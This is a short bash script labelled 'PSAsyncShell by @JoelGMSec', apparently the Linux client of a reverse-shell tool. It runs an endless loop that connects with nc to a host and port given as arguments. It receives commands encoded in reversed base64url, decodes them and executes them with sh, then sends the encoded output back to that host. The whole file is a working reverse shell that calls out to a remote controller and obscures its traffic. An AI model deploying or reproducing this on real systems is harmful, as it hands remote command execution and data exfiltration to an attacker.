#!/bin/bash
#================================#
#   PSAsyncShell by @JoelGMSec   #
#      https://darkbyte.net      #
#================================#

# Variables
host=$2
port=$3

# Main
while $true ; do
base64url=$(echo -n $(pwd) | base64 | tr '/+' '_-' | tr -d '=' | rev | nc $host $port 2> /dev/null)
base64url=$(echo -n $base64url | rev)
base64url=$(echo -n "$base64url"==== | fold -w 4 | sed '$ d' | tr -d '\n' | tr '_-' '/+' | base64 -d)
sleep 0.5

if [[ $base64url == "exit" ]] ; then
exit 0
fi 

if [[ ! $base64url == "[+]*" ]] ; then
base64url=$(echo -n "$base64url" | sed "s/Set-Location/cd/")
base64url=$(echo -n "$base64url" | sh 2> /dev/null | base64 | tr '/+' '_-' | tr -d '=' | tr -d '[:space:]' | rev)
echo -n "$base64url" | nc $host $port > /dev/null 2>&1
fi ; done
